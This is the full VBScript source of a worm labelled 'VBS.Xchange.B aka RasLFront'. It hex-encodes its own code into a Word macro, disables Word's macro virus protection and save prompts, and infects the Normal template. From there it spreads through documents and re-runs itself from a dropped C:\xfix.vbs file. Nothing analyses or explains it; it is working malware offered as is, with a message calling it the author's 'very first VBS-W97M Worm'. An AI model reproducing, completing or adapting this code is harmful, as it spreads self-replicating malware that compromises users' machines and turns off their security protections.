'VBS.Xchange.B aka RasLFront
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set fl=fso.OpenTextFile(WScript.ScriptFullname,1)
virus=fl.ReadAll
fl.Close

Set win=fso.GetSpecialFolder(0)
fcopy=win&"\XchgFix.vbs"
reg="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
'fso.GetFile(WScript.ScriptFullName).Copy(fcopy)
'ws.RegWrite reg&"\MsExchangeFix",fcopy

set sp=fso.CreateTextFile("C:\rlf.sys",True,8)
sp.WriteLine "Private Sub Document_Open()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "e = """""

For i=1 To len(virus)

e=Mid(virus,i,1)
e=Hex(Asc(e))

If Len(e)=1 Then
e="0"&e
End If

f=f+e
If Len(f)=110 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

If Len(virus)-i = 0 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

Next


sp.WriteLine "Call infect_fichier"
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub HelpAbout()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "MsgBox ""This is my very first VBS-W97M Worm"", vbInformation, ""I-Worm.Xchange"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub AutoClose()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "FileSystem.Kill ""C:\xfix.vbs"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub infect_fichier()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "Set nor = NormalTemplate.VBProject.VBComponents(1)"
sp.WriteLine "Set doc = ActiveDocument.VBProject.VBComponents(1)"
sp.WriteLine "df = ""C:\rlf.sys"""
sp.WriteLine "If nor.Name <> ""raslfront"" Then"
sp.WriteLine "nor.Name = ""raslfront"""
sp.WriteLine "read=dec(e)"
sp.WriteLine "Open ""C:\xfix.vbs"" For Output As #1"
sp.WriteLine "Print #1, read"
sp.WriteLine "Close #1"
sp.WriteLine "Shell ""wscript C:\xfix.vbs"""
sp.WriteLine "End If"
sp.WriteLine ""
sp.WriteLine "Function dec(octe)"
sp.WriteLine "For hexad = 1 To Len(octe) Step 2"
sp.WriteLine "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))"
sp.WriteLine "Next"
sp.WriteLine "End Function"
sp.Close

Set wrd=CreateObject("Word.Application")
wrd.Options.virusprotection=0
wrd.Options.savenormalprompt=0
wrd.Options.confirmconversion=0
If wrd.normaltemplate.vbproject.vbcomponents(1).name <> "raslfront" Then
wrd.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromFile("C:\rlf.sys")
wrd.normaltemplate.vbproject.vbcomponents(1).name="raslfront"
MsgBox "Pas Encore"
End If
wrd.Application.Quit
WScript.Quit
